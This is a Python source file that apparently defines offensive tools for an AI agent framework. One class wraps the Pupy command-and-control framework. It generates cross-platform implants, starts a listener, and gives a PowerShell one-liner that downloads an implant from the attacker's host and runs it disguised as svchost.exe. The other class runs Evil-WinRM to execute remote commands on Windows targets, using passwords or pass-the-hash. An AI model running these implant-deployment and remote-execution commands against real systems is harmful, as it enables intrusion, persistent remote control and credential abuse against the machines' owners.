from ...core.registry import BaseTool


class Pupy(BaseTool):
    name = "pupy"
    description = "Pupy C2 deployment and management. Generate and deploy cross-platform implants for post-exploitation."

    async def execute(self, params: dict) -> dict:
        lhost = params.get("lhost", "")
        lport = params.get("lport", 443)
        transport = params.get("transport", "ssl")
        action = params.get("action", "generate")

        instructions = f"""
Pupy C2 — {action.upper()}
  LHOST: {lhost}
  LPORT: {lport}
  Transport: {transport}

  Generate implant:
    pupy.sh -D connect --host {lhost}:{lport} -t {transport} -O /tmp/pupy_{transport}.exe

  Start listener:
    pupysh.sh --transport {transport} -b {lhost}:{lport}

  Deploy on target (Windows):
    powershell -c "Invoke-WebRequest -Uri http://{lhost}:8080/pupy.exe -OutFile $env:TEMP\\svchost.exe; Start-Process $env:TEMP\\svchost.exe"

  Check sessions:
    In pupysh: sessions -l
"""
        return {"action": action, "lhost": lhost, "lport": lport, "instructions": instructions}


class EvilWinRM(BaseTool):
    name = "evil-winrm"
    description = "Evil-WinRM for Windows remote command execution via WinRM."

    async def execute(self, params: dict) -> dict:
        target = params.get("target", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hash_val = params.get("hash", "")
        command = params.get("command", "whoami")

        cmd_parts = ["evil-winrm", "-i", target]
        if username:
            cmd_parts.extend(["-u", username])
        if password:
            cmd_parts.extend(["-p", password])
        if hash_val:
            cmd_parts.extend(["-H", hash_val])
        cmd_parts.extend(["-c", command])

        import subprocess
        result = subprocess.run(cmd_parts, capture_output=True, text=True, timeout=60)
        output = result.stdout or result.stderr

        return {"target": target, "command": command, "output": output}
